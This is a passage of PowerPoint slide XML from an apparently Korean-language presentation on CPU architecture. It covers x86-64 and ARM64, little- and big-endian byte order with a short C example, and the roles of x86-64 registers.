          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="282313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2A7BF85-EFF0-4169-9F33-5B30AFBB9A2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240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29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2765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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처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7100B8-8C44-4182-BB3F-F98A768C7E16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1888030" y="2246202"/>
            <a:ext cx="2531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x86-64 (AMD64, Intel 64)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9C1C11-0397-4105-84F7-A55C1901835A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5282524" y="2254301"/>
            <a:ext cx="1204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ARM64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B654C19-A88D-4260-A0B6-7D701D3722FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1880472" y="2585412"/>
            <a:ext cx="2519028" cy="33587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현재 가장 많이 사용되는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CPU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아키텍처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1200"/>
              </a:spcBef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개인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PC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부터 기업 서버까지 다양하게 사용된다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545E26C-547B-4515-933F-7DC40CC7672A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4488352" y="2585412"/>
            <a:ext cx="2519028" cy="335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x86-64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에 비해 경량화 되고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단순한 명령어로 빠른 실행이 가능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현재 대부분의 모바일 기기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(Android, iOS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등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는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ARM32,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ARM64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를 사용한다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C6B51-7262-FD4C-14FC-6C7F4D664A84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7870052" y="2246202"/>
            <a:ext cx="945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810D05-7CBA-B40F-3D45-C7A9A81100AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7083437" y="2585412"/>
            <a:ext cx="2519028" cy="335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이 외에도 특정 서비스를 위해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1200"/>
              </a:spcBef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개발된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TMS320(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디지털 신호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1200"/>
              </a:spcBef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처리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), IA-64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등 아키텍처 존재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9757FD-4D2A-311A-D78F-EE1376385A97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1131117"/>
            <a:ext cx="994590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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>란</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>설계 구조 등 컴퓨터 시스템의 하드웨어 설계 및 구조를 의미합니다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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처에 따라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레지스터 구조</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,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명령어 집합 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>등이 달라지게 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대표적으로 일상에서 가장 많이 접하는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CPU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아키텍처</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>는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x86-64 (PC), ARM64(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>핸드폰</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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endParaRPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="3939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77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62CCF-542E-3C4F-733D-C5BF666D9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66F88F-5A75-6D75-705E-8916EDEFA16D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B38AC-BDEE-48AD-BDE7-A41CFFBCA0AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4338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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- Endian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9427E-2F45-CC30-958A-6EE373FB3861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F5ADDA-79AE-08C9-08C9-9981F9071317}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2760038" y="2563756"/>
            <a:ext cx="1481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Little Endian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BBC4FC-692E-2096-5A11-89290A108BCC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7645832" y="2563756"/>
            <a:ext cx="1289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Big Endian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757287-042D-27EF-91E3-4E1A88618C50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2141729" y="2902310"/>
            <a:ext cx="2519028" cy="26798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작은 단위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(LSB)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가 먼저 작은 주소에 저장되는 방식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ex) 0x1234</a:t>
            </a:r>
          </a:p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[0] = 0x34</a:t>
            </a:r>
          </a:p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[1] = 0x12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C7716AC-4FA6-3432-6C67-07E026E2D9C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7031255" y="2910972"/>
            <a:ext cx="2519028" cy="26712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큰 단위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(MSB)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가 먼저 작은 주소에 저장되는 방식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ex) 0x1234</a:t>
            </a:r>
          </a:p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[0] = 0x12</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/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[1] = 0x34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3700C0-DC7F-D7BD-D484-6D1176ABDF4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1212654"/>
            <a:ext cx="994590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b="1" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>엔디안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이란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컴퓨터가</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 메모리에 데이터를 저장하는 방식</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>을 의미합니다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 err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>엔디안의</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 종류에는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Little Endian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>과 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Big Endian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이 있으며 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처에 의해 설정됩니다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일반적으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x86_64 &amp; arm64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 경우 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Little Endian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>을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사용합니다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223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61DA8-4A6E-1BE4-E866-7467F823F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43DDDDF-63C6-6140-C2AC-A1B04808F0C3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7A357-D478-D0B5-0DAD-795DFA082047}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4338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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- Endian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EF63C-B8AE-0EFB-AC18-DE965BA731CD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CAD33D-F486-2EE0-B02D-73BA339B5E1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1131117"/>
            <a:ext cx="994590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예제 코드로 확인해보면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Little Endian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이므로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x12345678 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 저장된 메모리 확인 시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낮은 단위가 먼저 메모리에 들어가므로 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en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x7fffffffe104 = 0x78	0x7fffffffe105 = 0x56	0x7fffffffe106 = 0x34	 0x7fffffffe107 = 0x12 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총 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>바이트가 들어갔습니다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ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[0] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>값은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 아닌 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x78</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이 출력됩니다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10" name="그래픽 9" descr="오른쪽 화살표 단색으로 채워진">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74D2B3C3-9CD3-6BB6-2A92-2746420BA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6389" y="4091395"/>
            <a:ext cx="457200" cy="4572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D475B6-55DD-46D0-7957-CA350C688100}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="307418" y="3148440"/>
            <a:ext cx="5473418" cy="23431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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h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int main() {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int num = 0x12345678;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char *</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = (char*)&amp;num;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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("%x", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[0]);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return 0;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}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9F29207-3377-D814-E96D-CD82E4C87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726" y="3596095"/>
            <a:ext cx="4591050" cy="4953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8BFDC36-D276-C7FE-A39B-17F54BF7E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976" y="4378696"/>
            <a:ext cx="4400550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90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55DB8-1BDB-2C89-45A7-FC3E6F22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D626DC-7834-9458-0D4F-A5A41498BDC1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415F7-557B-552D-0FF5-FE1BBFC58878}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4527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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- Register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7C6E8-6A36-8BCD-2123-19771BCF9B49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2B3E00-3212-1380-719F-A8D3E6D79067}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1188720"/>
            <a:ext cx="994590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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>레지스터</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>란</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가 연산</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>함수 호출 및 복귀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연산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등등 모든 과정</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400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을 위해 사용하는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메모리 저장 장치</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x86-64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아키텍처</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서의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주요 레지스터</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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2672836-00D1-FA67-EB43-F5813D4CF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068848"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1123046" y="2325189"/>
          <a:ext cx="9945908" cy="3431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1571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2748037351"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6784337">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="820828031"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="365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레지스터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3200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RAX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함수의 반환 값 저장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syscall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호출 시 시스템 함수 넘버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200448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RBX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주소 계산 및 데이터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358619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RCX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루프 및 반복 연산 비교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, </a:t>
                      </a:r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함수 호출 시 네번째 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00695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RDX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곱셈 나눗셈 결과 저장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 호출 시 세번째 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6960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RDI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목적지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(destination)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인덱스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 호출 시 첫번째 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289467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RSI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소스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(source)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인덱스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 호출 시 두번째 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256947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RBP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스택 프레임 포인터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함수의 베이스 포인터 위치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714054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RSP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스택의 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1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최상단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주소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(push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 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수행 시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rsp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값에 수행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866713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R8</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US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R15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 범용 레지스터 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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(r8, r9</a:t>
                      </a:r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함수 호출 시 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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5, 6 </a:t>
                      </a:r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번째 인자</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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610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96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E552B-EC01-2899-4817-A48F3EE6E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0EBF07-AEF0-D072-CF2C-F7E34CB48960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FCDE4-7DED-68FE-9617-797A7BFF39AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4527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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- Register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47C3E-F473-BF93-495D-1E5CE9962D77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511397-7C4C-55EA-4BCA-BF3814F46018}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399062" y="1529413"/>
            <a:ext cx="5473418" cy="4997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F65D99D-9892-0F20-DBCA-76EE8BFDB3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063"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="391057" y="1826259"/>
            <a:ext cx="5473418" cy="30194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303AE79-1BFF-20CB-6F1D-F56E0CAF2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75" y="5362654"/>
            <a:ext cx="4505325" cy="647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59DD25-DCAF-DB85-127F-7CCFE2187A16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6687024" y="2777667"/>
            <a:ext cx="4137474" cy="77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j-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>프로그램 디버깅 시 레지스터 확인 가능</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0"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j-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>RSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>값 주소 메모리 확인 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>0x218c0329 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>확인 가능</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1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8872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DCF1E-7080-61E8-2602-13F79DC6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932A3C6-3AF3-280D-30DC-D147EE529529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390E9-6744-7D52-53F8-1A7D71D040F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4527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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- Register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91C50B-D7D4-684F-B33A-DC9163E464ED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A5F9A-65CD-D850-E23F-0990E597ACC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1249010"/>
            <a:ext cx="9945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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Arm64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아키텍처</a:t>
            </a:r>
            <a:r>
